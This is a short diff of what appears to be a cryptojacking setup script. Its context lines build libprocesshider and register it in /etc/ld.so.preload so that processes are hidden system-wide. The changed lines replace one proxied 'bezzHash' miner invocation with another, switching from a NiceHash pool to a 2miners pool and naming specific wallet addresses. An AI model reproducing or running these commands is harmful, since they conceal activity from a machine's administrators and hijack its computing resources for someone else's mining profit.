@@ -44,5 +44,4 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./bezzHash --url=ssl://3JY74Gx62oywiE29hiXe456o4noZdgHJ6Q@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --algo ETHASH --pool eth.2miners.com:2020 --user 1BoMobqHdFWZfY4A4HmvYnGBT4G9eu1pjX.budakbuncir
